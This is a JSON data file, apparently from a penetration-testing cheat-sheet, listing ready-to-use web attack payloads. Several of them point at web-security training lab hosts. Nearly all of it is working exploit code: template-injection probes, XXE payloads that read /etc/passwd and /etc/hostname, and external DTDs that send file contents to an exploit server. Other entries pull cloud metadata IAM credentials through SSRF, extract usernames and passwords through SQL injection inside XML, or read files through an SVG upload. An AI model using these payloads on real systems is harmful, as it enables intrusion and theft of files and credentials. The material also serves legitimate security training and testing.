[{"name": "SSTI identify", "description": "Basic commands to identify template injection.", "commands": [{"command": "${{<%[%'\"}}%\\.", "description": "Polyglot"}, {"command": "${7*7}\n{{7*7}}\na{*aa*}b\n{{7*'7'}}\n", "description": "Payloads for different templating processors."}], "slug": "ssti-simple", "id": 0, "tags": [{"name": "SSTI", "slug": "ssti"}]}, {"name": "Error based XXE with external dtd", "description": null, "commands": [{"command": "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">\n%eval;\n%error;\n", "description": "External hosted dtd, which errors because the second entity does not exist. Only works when errors are displayed."}, {"command": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE stockCheck [ \n  <!ENTITY % remote SYSTEM \"https://exploit-0a670061047a8aca823e644301e900d7.exploit-server.net/exploit.dtd\">\n  %remote;\n]>\n\n<stockCheck><productId>9</productId><storeId>1</storeId></stockCheck>\n", "description": "Payload to load the external dtd file and call %remote."}], "slug": "xxe-external-dtd-error", "id": 1, "tags": [{"name": "LFI", "slug": "lfi"}, {"name": "XXE", "slug": "xxe"}]}, {"name": "XXE external dtd", "description": "XXE attack with an external hosted dtd file.", "commands": [{"command": "<!ENTITY % file SYSTEM \"file:///etc/hostname\">\n<!ENTITY % oob \"<!ENTITY &#x25; content SYSTEM 'https://exploit-0abd004f034a3ca18694038401ae00d6.exploit-server.net?content=%file;'>\">\n%oob;\n%content;\n", "description": "External hosted dtd, which exfiltrates /etc/hostname to an exploit server. The % symbol inside the oob entity has to be hex encoded."}, {"command": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE stockCheck [ \n  <!ENTITY % remote SYSTEM \"https://exploit-0abd004f034a3ca18694038401ae00d6.exploit-server.net/exploit2.dtd\">\n  %remote;\n]>\n<stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>\n", "description": "Payload to load the external dtd file and call %remote."}], "slug": "xxe-external-dtd", "id": 2, "tags": [{"name": "LFI", "slug": "lfi"}, {"name": "XXE", "slug": "xxe"}]}, {"name": "XXE LFI Xinclude", "description": null, "commands": [{"command": "productId=<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>&storeId=1\n", "description": "LFI with Xinclude"}], "slug": "xxe-lfi-xinclude", "id": 3, "tags": [{"name": "LFI", "slug": "lfi"}, {"name": "XXE", "slug": "xxe"}]}, {"name": "XXE LFI", "description": "LFI payloads for XXE with custom and parameter entities.", "commands": [{"command": "<?xml version=\"1.0\" encoding=\"UTF-8\"?> \n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> \n<stockCheck>\n    <productId>&xxe;</productId>\n</stockCheck>\n", "description": "LFI with custom entities"}, {"command": "<?xml version=\"1.0\" encoding=\"UTF-8\"?> \n<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> ]> \n<stockCheck>\n    <productId>%xxe;</productId>\n</stockCheck>\n", "description": "LFI with parameter entities"}, {"command": "<?xml version=\"1.0\" encoding=\"UTF-8\"?> \n<@hex_entities>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> \n<@hex_entities>\n<stockCheck>\n    <productId>&xxe;</productId>\n</stockCheck>\n", "description": "HEX encoded command with HackVector"}], "slug": "xxe-lfi", "id": 4, "tags": [{"name": "LFI", "slug": "lfi"}, {"name": "XXE", "slug": "xxe"}]}, {"name": "XXE with local dtd", "description": "This requires a local dtd file. See references for a wordlist.", "commands": [{"command": "<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\"> <!ENTITY % ISOamsb '<!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\"><!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error;'> %local_dtd;%ISOamsb;]>\n", "description": "Error based dtd attack, it is important to encode %, & and % for the second entity."}], "references": ["https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/"], "slug": "xxe-local-dtd", "id": 5, "tags": [{"name": "LFI", "slug": "lfi"}, {"name": "XXE", "slug": "xxe"}]}, {"name": "XXE OAST attack", "description": null, "commands": [{"command": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://il7x2chwkv9xg2k75cd8do2ft6zxnvbk.oastify.com\"> ]>\n<stockCheck><productId>1&xxe;</productId><storeId>1</storeId></stockCheck>\n", "description": "OAST with custom entities"}, {"command": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM \"http://wyybfquax9mbtgxliqqmq2ft6kcb0do2.oastify.com\"> %xxe;]>\n<stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>\n", "description": "OAST with parameter entities"}], "slug": "xxe-oast", "id": 6, "tags": [{"name": "OAST", "slug": "oast"}, {"name": "XXE", "slug": "xxe"}]}, {"name": "XXE SQLi", "description": "SQL injection inside XXE payload", "commands": [{"command": "<storeId>\n<@hex_entities>\n1 UNION SELECT password || '~' || username from users;\n<@/hex_entities>\n</storeId>\n", "description": "HEX encoded SQLi with XXE and combinding two rows with ~"}], "slug": "xxe-sqli", "id": 7, "tags": [{"name": "SQLi", "slug": "sqli"}, {"name": "XXE", "slug": "xxe"}]}, {"name": "XXE SSRF attack", "description": "SSRF attack over XXE", "commands": [{"command": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE productId \n[<!ENTITY ssrf SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\" > ]>\n<stockCheck>\n    <productId>&ssrf;</productId>\n    <storeId>1</storeId>\n</stockCheck>\n"}], "slug": "xxe-ssrf", "id": 8, "tags": [{"name": "SSRF", "slug": "ssrf"}, {"name": "XXE", "slug": "xxe"}]}, {"name": "XXE SVG LFI", "description": "Indirect LFI via an SVG image.", "commands": [{"command": "Content-Disposition: form-data; name=\"avatar\"; filename=\"dog.svg\"\nContent-Type: image/svg\n<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg>\n", "description": "This will create an image with the contents of /etc/hostname"}], "slug": "xxe-svg", "id": 9, "tags": [{"name": "LFI", "slug": "lfi"}, {"name": "XXE", "slug": "xxe"}]}]